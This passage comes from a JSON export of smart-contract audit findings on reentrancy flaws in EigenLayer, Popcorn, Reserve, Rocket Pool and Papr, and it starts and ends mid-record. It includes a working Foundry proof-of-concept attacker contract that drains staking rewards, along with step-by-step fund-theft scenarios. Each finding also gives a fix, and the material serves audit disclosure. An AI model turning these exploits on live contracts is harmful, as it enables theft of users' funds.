      "summary": "\nThis bug report discusses the potential vulnerability of the `StrategyBase` contract to a token contract that employs some sort of callback to a function like `sharesToUnderlyingView`, before the balance change is reflected in the contract. This could lead to an incorrect return value from `sharesToUnderlyingView`. To protect the contract from reentrancy, it is recommended to employ comprehensive and defensive reentrancy protection based on reentrancy guards such as OpenZeppelin’s ReentrancyGuardUpgradeable, which is already used in the `StrategyManager`. Additionally, external functions in strategies that should only be callable by the strategy manager should have the `onlyStrategyManager` modifier, and external functions in strategies for which this does not apply should query the strategy manager’s reentrancy lock and revert if it is set. Furthermore, `view` functions that provide correct results should query the reentrancy lock and revert if it is set. Finally, if `public` functions are also used internally, checks against reentrancy can cause problems (if used in an internal context) or at least be redundant. All of these measures should be taken to ensure the security of the contract.",
      "report_date": {},
      "contest_prize_txt": "",
      "contest_link": "",
      "sponsor_name": "",
      "sponsor_link": "",
      "quality_score": 4,
      "general_score": 2,
      "source_link": "https://consensys.net/diligence/audits/2023/03/eigenlabs-eigenlayer/",
      "github_link": "",
      "pdf_link": "",
      "pdf_page_from": 0,
      "contest_id": "",
      "slug": "potential-reentrancy-into-strategies-consensys-eigenlabs-eigenlayer-markdown",
      "firm_name": "ConsenSys",
      "firm_logo_square": "consensys_square.png",
      "protocol_name": "EigenLabs — EigenLayer",
      "bookmarked": false,
      "read": false,
      "auditfirms_auditfirm": {
        "name": "ConsenSys",
        "logo_square": "consensys_square.png"
      },
      "protocols_protocol": {
        "name": "EigenLabs — EigenLayer",
        "protocols_protocolcategoryscore": [
          {
            "protocols_protocolcategory": {
              "title": "Dexes"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "CDP"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Services"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Cross Chain"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Launchpad"
            },
            "score": 0.5
          }
        ]
      },
      "issues_issuetagscore": [
        {
          "tags_tag": {
            "title": "Read-only Reentrancy"
          }
        },
        {
          "tags_tag": {
            "title": "Reentrancy"
          }
        }
      ]
    },
    {
      "id": "21989",
      "kind": "GIT",
      "auditfirm_id": "2",
      "impact": "HIGH",
      "finders_count": 32,
      "protocol_id": "900",
      "title": "[H-04] Staking rewards can be drained",
      "content": "\nIf ERC777 tokens are used for rewards, the entire balance of rewards in the staking contract can get drained by an attacker.\n\n### Proof of Concept\n\nERC777 allow users to register a hook to notify them when tokens are transferred to them.\n\nThis hook can be used to reenter the contract and drain the rewards.\n\nThe issue is in the `claimRewards` in `MultiRewardStaking`.\nThe function does not follow the checks-effects-interactions pattern and therefore can be reentered when transferring tokens in the for loop. <br><https://github.com/code-423n4/2023-01-popcorn/blob/d95fc31449c260901811196d617366d6352258cd/src/utils/MultiRewardStaking.sol#L170-L187>\n\n      function claimRewards(address user, IERC20[] memory _rewardTokens) external accrueRewards(msg.sender, user) {\n        for (uint8 i; i < _rewardTokens.length; i++) {\n          uint256 rewardAmount = accruedRewards[user][_rewardTokens[i]];\n\n          if (rewardAmount == 0) revert ZeroRewards(_rewardTokens[i]);\n\n          EscrowInfo memory escrowInfo = escrowInfos[_rewardTokens[i]];\n\n          if (escrowInfo.escrowPercentage > 0) {\n            _lockToken(user, _rewardTokens[i], rewardAmount, escrowInfo);\n            emit RewardsClaimed(user, _rewardTokens[i], rewardAmount, true);\n          } else {\n            _rewardTokens[i].transfer(user, rewardAmount);\n            emit RewardsClaimed(user, _rewardTokens[i], rewardAmount, false);\n          }\n\n          accruedRewards[user][_rewardTokens[i]] = 0;\n        }\n\nAs can be seen above, the clearing of the `accruedRewards` is done AFTER the transfer when it should be BEFORE the transfer.\n\n**Foundry POC**\n\nThe POC demonstrates an end-to-end attack including a malicious hacker contract that steals the balance of the reward token.\n\nAdd the following file (drainRewards.t.sol) to the test directory: <br><https://github.com/code-423n4/2023-01-popcorn/tree/main/test>\n\n    // SPDX-License-Identifier: GPL-3.0\n    // Docgen-SOLC: 0.8.15\n\n    pragma solidity ^0.8.15;\n\n    import { Test } from \"forge-std/Test.sol\";\n    import { MockERC20 } from \"./utils/mocks/MockERC20.sol\";\n    import { IMultiRewardEscrow } from \"../src/interfaces/IMultiRewardEscrow.sol\";\n    import { MultiRewardStaking, IERC20 } from \"../src/utils/MultiRewardStaking.sol\";\n    import { MultiRewardEscrow } from \"../src/utils/MultiRewardEscrow.sol\";\n\n    import { ERC777 } from \"openzeppelin-contracts/token/ERC777/ERC777.sol\";\n\n    contract MockERC777 is ERC777 {\n      uint8 internal _decimals;\n      mapping(address => address) private registry;\n\n        constructor() ERC777(\"MockERC777\", \"777\", new address[](0)) {}\n\n\n      function decimals() public pure override returns (uint8) {\n        return uint8(18);\n      }\n\n      function mint(address to, uint256 value) public virtual {\n        _mint(to, value, hex'', hex'', false);\n      }\n\n      function burn(address from, uint256 value) public virtual {\n        _mint(from, value, hex'', hex'');\n      }\n    }\n\n    contract Hacker {\n        IERC20[] public rewardsTokenKeys;\n        MultiRewardStaking staking;\n        constructor(IERC20[] memory _rewardsTokenKeys, MultiRewardStaking _staking){\n          rewardsTokenKeys = _rewardsTokenKeys;\n          staking = _staking;\n\n          // register hook\n          bytes32 erc777Hash = keccak256(\"ERC777TokensRecipient\");\n          bytes memory data = abi.encodeWithSignature(\"setInterfaceImplementer(address,bytes32,address)\", address(this), erc777Hash, address(this));\n          address(0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24).call(data);\n        }\n\n        // deposit into staking\n        function approveAndDeposit() external {\n          IERC20 stakingToken = IERC20(staking.asset());\n          stakingToken.approve(address(staking), 1 ether);\n          staking.deposit(1 ether);\n        }\n\n        function startHack() external {\n          // Claim and reenter until staking contract is drained\n          staking.claimRewards(address(this), rewardsTokenKeys);\n        }\n        function tokensReceived(\n            address operator,\n            address from,\n            address to,\n            uint256 amount,\n            bytes calldata userData,\n            bytes calldata operatorData\n        ) external {\n          // continue as long as the balance of the reward token is positive\n          // In real life, we should check the lower boundry to prevent a revert\n          // when trying to send more then the balance.\n          if(ERC777(msg.sender).balanceOf(address(staking)) > 0){\n            staking.claimRewards(address(this), rewardsTokenKeys);\n          }\n        }\n    }\n\n    contract DrainRewards is Test {\n      MockERC20 stakingToken;\n      MockERC777 rewardToken1;\n      IERC20 iRewardToken1;\n      MultiRewardStaking staking;\n      MultiRewardEscrow escrow;\n\n      address feeRecipient = address(0x9999);\n      \n\n      function setUp() public {\n        stakingToken = new MockERC20(\"Staking Token\", \"STKN\", 18);\n        rewardToken1 = new MockERC777();\n        iRewardToken1 = IERC20(address(rewardToken1));\n        escrow = new MultiRewardEscrow(address(this), feeRecipient);\n        staking = new MultiRewardStaking();\n        staking.initialize(IERC20(address(stakingToken)), IMultiRewardEscrow(address(escrow)), address(this));\n      }\n\n      function _addRewardToken(MockERC777 rewardsToken) internal {\n        rewardsToken.mint(address(this), 10 ether);\n        rewardsToken.approve(address(staking), 10 ether);\n        staking.addRewardToken(IERC20(address(rewardsToken)), 0.1 ether, 10 ether, false, 0, 0, 0);\n      }\n\n      function test__claim_reentrancy() public {\n        // Prepare array for `claimRewards`\n        IERC20[] memory rewardsTokenKeys = new IERC20[](1);\n        rewardsTokenKeys[0] = iRewardToken1;\n\n        // setup hacker contract\n        Hacker hacker = new Hacker(rewardsTokenKeys, staking);\n        address hackerAddr = address(hacker);\n        stakingToken.mint(hackerAddr, 1 ether);\n        hacker.approveAndDeposit();\n\n        // Add reward token to staking \n        _addRewardToken(rewardToken1);\n\n        // 10% of rewards paid out\n        vm.warp(block.timestamp + 10);\n\n        // Get the full rewards held by the staking contract\n        uint256 full_rewards_amount = iRewardToken1.balanceOf(address(staking));\n\n        // Call hacker to start claiming the rewards and reenter\n        hacker.startHack();\n\n        // validate we received 100% of rewards (10 eth)\n        assertEq(rewardToken1.balanceOf(hackerAddr), full_rewards_amount);\n      }\n    }\n\nTo run the POC, execute the following command:\n\n    forge test -m \"test__claim_reentrancy\" --fork-url=<MAINNET FORK>\n\nExpected results:\n\n    Running 1 test for test/drainRewards.t.sol:DrainRewards\n    [PASS] test__claim_reentrancy() (gas: 1018771)\n    Test result: ok. 1 passed; 0 failed; finished in 6.46s\n\n### Tools Used\n\nFoundry, VS Code\n\n### Recommended Mitigation Steps\n\nFollow the checks-effects-interactions pattern and clear out `accruedRewards[user][_rewardTokens[i]]` before transferring.\n\nAdditionally, it would be a good idea to add a ReentrancyGuard modifier to the function.\n\n**[RedVeil (Popcorn) confirmed, but disagreed with severity](https://github.com/code-423n4/2023-01-popcorn-findings/issues/402)** \n\n***\n\n",
      "summary": "\nA bug was found in the `MultiRewardStaking` contract which allows an attacker to drain the entire balance of the rewards in the staking contract. This is due to the `claimRewards` function not following the checks-effects-interactions pattern and therefore can be reentered when transferring tokens in the for loop. A Proof of Concept (POC) was created to demonstrate an end-to-end attack including a malicious hacker contract that steals the balance of the reward token. Foundry and VS Code were used to create the POC. To mitigate the issue, it is recommended to follow the checks-effects-interactions pattern and clear out `accruedRewards[user][_rewardTokens[i]]` before transferring. Additionally, it would be a good idea to add a ReentrancyGuard modifier to the function.",
      "report_date": {},
      "contest_prize_txt": "$90,500 USDC",
      "contest_link": "https://code4rena.com/reports/2023-01-popcorn",
      "sponsor_name": "Popcorn",
      "sponsor_link": "",
      "quality_score": 0,
      "general_score": 0,
      "source_link": "https://code4rena.com/reports/2023-01-popcorn",
      "github_link": "https://github.com/code-423n4/2023-01-popcorn-findings/issues/402",
      "pdf_link": "",
      "pdf_page_from": 0,
      "contest_id": "211",
      "slug": "h-04-staking-rewards-can-be-drained-code4rena-popcorn-popcorn-contest-git",
      "firm_name": "Code4rena",
      "firm_logo_square": "code4rena_square.png",
      "protocol_name": "Popcorn",
      "bookmarked": false,
      "read": false,
      "auditfirms_auditfirm": {
        "name": "Code4rena",
        "logo_square": "code4rena_square.png"
      },
      "protocols_protocol": {
        "name": "Popcorn",
        "protocols_protocolcategoryscore": [
          {
            "protocols_protocolcategory": {
              "title": "Yield"
            },
            "score": 1
          },
          {
            "protocols_protocolcategory": {
              "title": "Staking Pool"
            },
            "score": 1
          }
        ]
      },
      "issues_issuetagscore": [
        {
          "tags_tag": {
            "title": "Reentrancy"
          }
        },
        {
          "tags_tag": {
            "title": "ERC777"
          }
        }
      ]
    },
    {
      "id": "16017",
      "kind": "GIT",
      "auditfirm_id": "2",
      "impact": "MEDIUM",
      "finders_count": 5,
      "protocol_id": "1057",
      "title": "[M-07] Attacker can steal RToken holders’ funds by performing reentrancy attack during redeem() function token transfers",
      "content": "## Lines of code\n\nhttps://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/RToken.sol#L439-L514\nhttps://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/BackingManager.sol#L105-L150\n\n\n## Vulnerability details\n\n## Impact\nFunction `redeem()` redeems RToken for basket collateral and it updated `basketsNeeded` and transfers users basket ERC20 from BackingManager to user address. it loops through tokens and transfer them to caller and if one of tokens were ERC777 or any other 3rd party protocol token with hook, attacker can perform reentrancy attack during token transfers. Attacker can cause multiple impacts by choosing the reentrancy function:\n1. attacker can call `redeem()` again and bypass \"bounding each withdrawal by the prorata share when protocol is under-collateralized\" because tokens balance of BackingManager is not updated yet.\n2. attacker can call `BackingManager.manageTokens()` and because `basketsNeeded` gets decreased and basket tokens balances of BasketManager are not updated, code would detect those tokens as excess funds and would distribute them between RSR stakers and RToken holders and some of RToken deposits would get transferred to RSR holders as rewards.\n\n## Proof of Concept\nThis is `redeem()` code:\n```\n    function redeem(uint256 amount) external notFrozen {\n...............\n...............\n        (address[] memory erc20s, uint256[] memory amounts) = basketHandler.quote(baskets, FLOOR);\n\n        uint256 erc20length = erc20s.length;\n\n        uint192 prorate = uint192((FIX_ONE_256 * amount) / supply);\n\n        // Bound each withdrawal by the prorata share, in case we're currently under-collateralized\n        for (uint256 i = 0; i < erc20length; ++i) {\n            uint256 bal = IERC20Upgradeable(erc20s[i]).balanceOf(address(backingManager));\n\n            uint256 prorata = (prorate > 0)\n                ? (prorate * bal) / FIX_ONE // {qTok} = D18{1} * {qTok} / D18\n                : mulDiv256(bal, amount, supply); // {qTok} = {qTok} * {qRTok} / {qRTok}\n\n            if (prorata < amounts[i]) amounts[i] = prorata;\n        }\n\n        basketsNeeded = basketsNeeded_ - baskets;\n        emit BasketsNeededChanged(basketsNeeded_, basketsNeeded);\n\n        // == Interactions ==\n        _burn(redeemer, amount);\n\n        bool allZero = true;\n        for (uint256 i = 0; i < erc20length; ++i) {\n            if (amounts[i] == 0) continue;\n            if (allZero) allZero = false;\n\n            IERC20Upgradeable(erc20s[i]).safeTransferFrom(\n                address(backingManager),\n                redeemer,\n                amounts[i]\n            );\n        }\n\n        if (allZero) revert(\"Empty redemption\");\n    }\n```\nAs you can see code calculates withdrawal amount of each basket erc20 tokens by calling `basketHandler.quote()` and then bounds each withdrawal by the prorata share of token balance, in case protocol is under-collateralized. and then code updates `basketsNeeded` and in the end transfers the tokens.  if one of those tokens were ERC777 then that token would call receiver hook function in token transfer. there may be other 3rd party protocol tokens that calls registered hook functions during the token transfer. as reserve protocol is permission less and tries to work with all tokens so the external call in the token transfer can call hook functions. attacker can use this hook and perform reentrancy attack.\nThis is `fullyCollateralized()` code in BasketHandler:\n```\n    function fullyCollateralized() external view returns (bool) {\n        return basketsHeldBy(address(backingManager)) >= rToken.basketsNeeded();\n    }\n```\nAs you can see it calculates baskets that can be held by backingManager tokens balance and needed baskets by RToken contract and by comparing them determines that if RToken is fully collateralized or not. if RToken is fully collateralized then `BackingManager.manageTokens()` would call `handoutExcessAssets()` and would distributes extra funds between RToken holders and RSR stakers.\nthe root cause of the issue is that during tokens transfers in `redeem()` not all the basket tokens balance of the BackingManager updates once and if one has hook function which calls attacker contract then attacker can use this updated token balance of the contract and perform his reentrancy attack. attacker can call different functions for reentrancy. these are two scenarios:\n** scenario #1: attacker call `redeem()` again and bypass prorata share bound check when protocol is under-collaterialized:\n1. tokens [`SOME_ERC777`, `USDT`] with quantity [1, 1] are in the basket right now and basket nonce is BasketNonce1.\n2. BackingManager has 200K `SOME_ERC777` balance and 100K `USDT` balance. `basketsNeeded` in RToken is 150K and RToken supply is 150K and attacker address Attacker1 has 30k RToken. battery charge allows for attacker to withdraw 30K tokens in one block.\n3. attacker would register a hook for his address in `SOME_ERC777` token to get called during transfers.\n4. attacker would call `redeem()` to redeem 15K RToken and code would updated `basketsNeeded` to 135K and code would bounds withdrawal by prorata shares of balance of the BackingManager because protocol is under-collateralized and code would calculated withdrawal amouns as 15K `SOME_ERC777` tokens and 10K `USDT` tokens (instead of 15K `USDT` tokens) for withdraws.\n5. then contract would transfer 15K `SOME_ERC777` tokens first to attacker address and attacker contract would get called during the hook function and now `basketsNeeded` is 135K and total RTokens is 135K and BackingManager balance is 185K `SOME_ERC777` and 100K `USDT` (`USDT` is not yet transferred). then attacker contract can call `redeem()` again for the remaining 15K RTokens.\n6. because protocol is under-collateralized code would calculated withdrawal amouns as 15K `SOME_ERC777` and 11.1K `USDT` (USDT_balance * rtokenAmount / totalSupply = 100K * 15K / 135K) and it would burn 15K RToken form caller and the new value of totalSupply of RTokens would be 120K and `basketsNeeded` would be 120K too. then code would transfers 15K `SOME_ERC777` and 11.1K `USDT` for attacker address. \n7. attacker's hook function would return and `redeem()` would transfer 10K `USDT` to attacker in the rest of the execution. attacker would receive 30K `SOME_ERC777` and 21.1K `USDT` tokens for 15K redeemed RToken but attacker should have get (`100 * 30K / 150K = 20K`) 20K `USDT` tokens because of the bound each withdrawal by the prorata share, in case we're currently under-collateralized.\n8. so attacker would be able to bypass the bounding check and withdraw more funds and stole other users funds. the attack is more effective if withdrawal battery charge is higher but in general case attacker can perform two withdraw each with about `charge/2` amount of RToken in each block and stole other users funds when protocol is under collaterlized.\n\n** scenario #2: attacker can call `BackingManager.manageTokens()` for reentrancy call:\n1. tokens [`SOME_ERC777`, `USDT`] with quantity [1, 1] are in the basket right now and basket nonce is BasketNonce1.\n2. BackingManager has 200K `SOME_ERC777` balance and 150K `USDT` balance. `basketsNeeded` in RToken is 150K and RToken supply is 150K and attacker address Attacker1 has 30k RToken. battery charge allows for attacker to withdraw 30K tokens in one block.\n3. attacker would register a hook for his address in `SOME_ERC777` token to get called during transfers.\n4. attacker would call `redeem()` to redeem 30K RToken and code would updated `basketsNeeded` to 120K and burn 30K RToken and code would calculated withdrawal amounts as 30K `SOME_ERC777` tokens and 30K `USDT` tokens for withdraws.\n5. then contract would transfer 30K `SOME_ERC777` tokens first to attacker address and attacker contract would get called during the hook function and now `basketsNeeded` is 120K and total RTokens is 120K and BackingManager balance is 170K `SOME_ERC777` and 150K `USDT` (`USDT` is not yet transferred). then attacker contract can call `BackingManager.manageTokens()`.\n6. function `manageTokens()` would calculated baskets can held by BackingManager and it would be higher than 150K and `basketsNeeded` would be 130K and code would consider 60K `SOME_ERC777` and 30K `USDT` tokens as revenue and try to distribute it between RSR stakers and RToken holders. code would mint 30K RTokens and would distribute it.\n7. then attacker hook function would return and `redeem()` would transfer 30K `USDT` to attacker address in rest of the execution.\n8. so attacker would able to make code to calculate RToken holders backed tokens as revenue and distribute it between RSR stakers and RSR stakers would receive RTokens backed tokens as rewards. the attack is more effective is battery charge is high but in general case attacker can call redeem for battery charge amount and cause those funds to be counted and get distributed to the RSR stakers (according to the rewards distribution rate)\n\n## Tools Used\nVIM\n\n## Recommended Mitigation Steps\nprevent reading reentrancy attack by central reentrancy guard or by one main proxy interface contract that has reentrancy guard.\nor create contract state (similar to basket nonce) which changes after each interaction and check for contracts states change during the call. (start and end of the call)",
      "summary": "\nThis bug report is about a reentrancy attack vulnerability in the Reserve Protocol. This attack can be used to bypass the prorata share bound check when the protocol is under-collateralized, as well as to make the code calculate RToken holders backed tokens as revenue and distribute it between RSR stakers. \n\nThe vulnerability occurs when the attacker registers a hook function in an ERC777 or 3rd party protocol token, and then calls the `redeem()` function in the RToken contract. The `redeem()` function updates the `basketsNeeded` variable, and then transfers the tokens. If one of these tokens has a hook function, the attacker can use this to perform a reentrancy attack. \n\nIn the first scenario, the attacker can call `redeem()` again and bypass the prorata share bound check when the protocol is under-collateralized. In the second scenario, the attacker can call `BackingManager.manageTokens()` and make the code calculate RToken holders backed tokens as revenue and distribute it between RSR stakers. \n\nThe recommended mitigation steps are to prevent reading reentrancy attacks by using a central reentrancy guard or by creating a main proxy interface contract that has a reentrancy guard. Alternatively, a contract state (similar to basket nonce) can be created which changes after each interaction, and then checked for changes during the call.",
      "report_date": {},
      "contest_prize_txt": "$210,500 USDC",
      "contest_link": "https://code4rena.com/contests/2023-01-reserve-contest",
      "sponsor_name": "Reserve",
      "sponsor_link": "https://twitter.com/reserveprotocol",
      "quality_score": 4,
      "general_score": 5,
      "source_link": "https://code4rena.com/reports/2023-01-reserve",
      "github_link": "https://github.com/code-423n4/2023-01-reserve-findings/issues/347",
      "pdf_link": "",
      "pdf_page_from": 0,
      "contest_id": "203",
      "slug": "m-07-attacker-can-steal-rtoken-holders-funds-by-performing-reentrancy-attack-during-redeem-function-token-transfers-code4rena-reserve-reserve-contest-git",
      "firm_name": "Code4rena",
      "firm_logo_square": "code4rena_square.png",
      "protocol_name": "Reserve",
      "bookmarked": false,
      "read": false,
      "auditfirms_auditfirm": {
        "name": "Code4rena",
        "logo_square": "code4rena_square.png"
      },
      "protocols_protocol": {
        "name": "Reserve",
        "protocols_protocolcategoryscore": [
          {
            "protocols_protocolcategory": {
              "title": "Liquid Staking"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "CDP"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Yield"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Launchpad"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Privacy"
            },
            "score": 0.5
          }
        ]
      },
      "issues_issuetagscore": [
        {
          "tags_tag": {
            "title": "Reentrancy"
          }
        }
      ]
    },
    {
      "id": "13202",
      "kind": "MARKDOWN",
      "auditfirm_id": "8",
      "impact": "HIGH",
      "finders_count": 2,
      "protocol_id": "66",
      "title": "RocketNodeDistributorDelegate - Reentrancy in distribute() allows node owner to drain distributor funds ✓ Fixed",
      "content": "#### Resolution\n\n\n\nFixed in <https://github.com/rocket-pool/rocketpool/tree/77d7cca65b7c0557cfda078a4fc45f9ac0cc6cc6> by implementing a custom reentrancy guard via a new state variable `lock` that is appended to the end of the storage layout. The reentrancy guard is functionally equivalent to the OpenZeppelin implementation. The method was not refactored to give user funds priority over the node share. Additionally, the client provided the following statement:\n\n\n\n> \n> We acknowledge this as a critical issue and have solved with a reentrancy guard.\n> \n> \n> \n\n\n\n> \n> We followed OpenZeppelin’s design for a reentrancy guard. We were unable to use it directly as it is hardcoded to use storage slot 0 and because we already have deployment of this delegate in the wild already using storage slot 0 for another purpose, we had to append it to the end of the existing storage layout.\n> \n> \n> \n\n\n\n\n#### Description\n\n\nThe `distribute()` function distributes the contract’s balance between the node operator and the user. The node operator is returned their initial collateral, including a fee. The rest is returned to the RETH token contract as user collateral.\n\n\nAfter determining the node owner’s share, the contract transfers `ETH` to the node withdrawal address, which can be the configured withdrawal address or the node address. Both addresses may potentially be a malicious contract that recursively calls back into the `distribute()` function to retrieve the node share multiple times until all funds are drained from the contract. The `distribute()` function is not protected against reentrancy:\n\n\n**code/contracts/contract/node/RocketNodeDistributorDelegate.sol:L59-L73**\n\n\n\n```\n/// @notice Distributes the balance of this contract to its owners\nfunction distribute() override external {\n    // Calculate node share\n    uint256 nodeShare = getNodeShare();\n    // Transfer node share\n    address withdrawalAddress = rocketStorage.getNodeWithdrawalAddress(nodeAddress);\n    (bool success,) = withdrawalAddress.call{value : nodeShare}(\"\");\n    require(success);\n    // Transfer user share\n    uint256 userShare = address(this).balance;\n    address rocketTokenRETH = rocketStorage.getAddress(rocketTokenRETHKey);\n    payable(rocketTokenRETH).transfer(userShare);\n    // Emit event\n    emit FeesDistributed(nodeAddress, userShare, nodeShare, block.timestamp);\n}\n\n```\nWe also noticed that any address could set a withdrawal address as there is no check for the caller to be a registered node. In fact, the caller can be the withdrawal address or node operator.\n\n\n**code/contracts/contract/RocketStorage.sol:L118-L133**\n\n\n\n```\n// Set a node's withdrawal address\nfunction setWithdrawalAddress(address \\_nodeAddress, address \\_newWithdrawalAddress, bool \\_confirm) external override {\n    // Check new withdrawal address\n    require(\\_newWithdrawalAddress != address(0x0), \"Invalid withdrawal address\");\n    // Confirm the transaction is from the node's current withdrawal address\n    address withdrawalAddress = getNodeWithdrawalAddress(\\_nodeAddress);\n    require(withdrawalAddress == msg.sender, \"Only a tx from a node's withdrawal address can update it\");\n    // Update immediately if confirmed\n    if (\\_confirm) {\n        updateWithdrawalAddress(\\_nodeAddress, \\_newWithdrawalAddress);\n    }\n    // Set pending withdrawal address if not confirmed\n    else {\n        pendingWithdrawalAddresses[\\_nodeAddress] = \\_newWithdrawalAddress;\n    }\n}\n\n```\n#### Recommendation\n\n\nAdd a reentrancy guard to functions that interact with untrusted contracts. Adhere to the checks-effects pattern and send user funds to the ‘trusted’ RETH contract first. Only then send funds to the node’s withdrawal address.",
      "summary": "\nA bug was discovered in the RocketPool RocketNodeDistributorDelegate contract's `distribute()` function, which distributes the contract's balance between the node operator and the user. The bug allowed malicious contracts to recursively call back into the `distribute()` function to retrieve the node share multiple times until all funds were drained from the contract. This was because the `distribute()` function was not protected against reentrancy. Additionally, any address could set a withdrawal address as there was no check for the caller to be a registered node.\n\nTo fix this bug, a custom reentrancy guard was implemented via a new state variable `lock` that was appended to the end of the storage layout. This reentrancy guard was functionally equivalent to the OpenZeppelin implementation. Additionally, the method was not refactored to give user funds priority over the node share.\n\nThe recommendation to prevent similar bugs in the future is to add a reentrancy guard to functions that interact with untrusted contracts. It is also recommended to adhere to the checks-effects pattern and send user funds to the ‘trusted’ RETH contract first, before sending funds to the node’s withdrawal address.",
      "report_date": {},
      "contest_prize_txt": "",
      "contest_link": "",
      "sponsor_name": "",
      "sponsor_link": "",
      "quality_score": 5,
      "general_score": 2,
      "source_link": "https://consensys.net/diligence/audits/2023/01/rocket-pool-atlas-v1.2/",
      "github_link": "",
      "pdf_link": "",
      "pdf_page_from": 0,
      "contest_id": "",
      "slug": "rocketnodedistributordelegate-reentrancy-in-distribute-allows-node-owner-to-drain-distributor-funds-fixed-consensys-rocket-pool-atlas-v12-markdown",
      "firm_name": "ConsenSys",
      "firm_logo_square": "consensys_square.png",
      "protocol_name": "Rocket Pool Atlas (v1.2)",
      "bookmarked": false,
      "read": false,
      "auditfirms_auditfirm": {
        "name": "ConsenSys",
        "logo_square": "consensys_square.png"
      },
      "protocols_protocol": {
        "name": "Rocket Pool Atlas (v1.2)",
        "protocols_protocolcategoryscore": []
      },
      "issues_issuetagscore": [
        {
          "tags_tag": {
            "title": "Reentrancy"
          }
        }
      ]
    },
    {
      "id": "6203",
      "kind": "GIT",
      "auditfirm_id": "2",
      "impact": "HIGH",
      "finders_count": 5,
      "protocol_id": "253",
      "title": "[H-02] Stealing fund by applying reentrancy attack on removeCollateral, startLiquidationAuction, and purchaseLiquidationAuctionNFT",
      "content": "## Lines of code\n\nhttps://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L444\n\n\n## Vulnerability details\n\n## Impact\n\nBy applying reentrancy attack involving the functions `removeCollateral`, `startLiquidationAuction`, and `purchaseLiquidationAuctionNFT`, an Attacker can steal large amount of fund.\n\n## Proof of Concept\n\n - Bob (a malicious user) deploys a contract to apply the attack. This contract is called `BobContract`. Please note that all the following transactions are going to be done in one transaction.\n - BobContract takes a flash loan of 500K USDC.\n - BobContract buys 10 NFTs with ids 1 to 10 from collection which are allowed to be used as collateral in this project. Suppose, each NFT has price of almost 50k USDC.\n - BobContract adds those NFTs as collateral by calling the function `addCollateral`. So `_vaultInfo[BobContract][collateral.addr].count = 10`.\n```\nfunction addCollateral(IPaprController.Collateral[] calldata collateralArr) external override {\n        for (uint256 i = 0; i < collateralArr.length;) {\n            _addCollateralToVault(msg.sender, collateralArr[i]);\n            collateralArr[i].addr.transferFrom(msg.sender, address(this), collateralArr[i].id);\n            unchecked {\n                ++i;\n            }\n        }\n    }\n```\nhttps://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L98\n - BobContract borrows the max allowed amount of `PaprToken` that is almost equivalent to 250k USDC (for simplicity I am assuming target price and mark price are equal to 1 USDC. This assumption does not change the attack scenario at all. It is only to simplify the explanation). This amount is equal to 50% of the collateral amount. It can be done by calling the function `increaseDebt`.\n ```\nfunction maxDebt(uint256 totalCollateraValue) external view override returns (uint256) {\n        if (_lastUpdated == block.timestamp) {\n            return _maxDebt(totalCollateraValue, _target);\n        }\n\n        return _maxDebt(totalCollateraValue, newTarget());\n    }\n```\nhttps://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L393\n```\nfunction _maxDebt(uint256 totalCollateraValue, uint256 cachedTarget) internal view returns (uint256) {\n        uint256 maxLoanUnderlying = totalCollateraValue * maxLTV;\n        return maxLoanUnderlying / cachedTarget;\n    }\n```\nhttps://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L556\n```\nfunction increaseDebt(\n        address mintTo,\n        ERC721 asset,\n        uint256 amount,\n        ReservoirOracleUnderwriter.OracleInfo calldata oracleInfo\n    ) external override {\n        _increaseDebt({account: msg.sender, asset: asset, mintTo: mintTo, amount: amount, oracleInfo: oracleInfo});\n    }\n```\nhttps://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L138\n - BobContract now has 10 NFTs as collateral (worth 500k) and borrowed 10*50k*50% = 250k.\n - BobContract intends to call the function `removeCollateral`. (In the normal way of working with the protocol, this is not allowed, because by removing even 1 NFT, the debt 250k becomes larger than max allowed collateral 9*50k*50%).\nhttps://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L109\n - Here is the trick. BobContract calls this function to remove the NFT with id 1. During the removal in the function `_removeCollateral`, the `safeTransferFrom` callbacks the BobContract.\nhttps://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L444\nhttps://github.com/transmissions11/solmate/blob/3a752b8c83427ed1ea1df23f092ea7a810205b6c/src/tokens/ERC721.sol#L120\n - In the callback, BobContract calls this function again to remove the next NFT (I mean the NFT with id 2).\n - BobContract repeats this for 9 NFTs. So, when all the NFTs with id 1 to 9 are removed from the protocol, in the last callback, BobContract calls the function `startLiquidationAuction` to put the NFT with id 10 on the auction. Please note that after removal of 9 NFTs, they are transferred to BobContract, and `_vaultInfo[BobContract][collateral.addr].count = 1`. So, BobContract health factor is not solvent any more because total debt is the same as before 250k, but max debt is now 1*50k*50% = 25k.\nhttps://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L438\nhttps://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L297\n - After calling the function `startLiquidationAuction`, it checks whether the debt is larger than max debt or not. Since 9 NFTs were removed in the previous steps, `info.count = 1`, so debt is larger than max debt. \n```\nif (info.debt < _maxDebt(oraclePrice * info.count, cachedTarget)) {\n            revert IPaprController.NotLiquidatable();\n        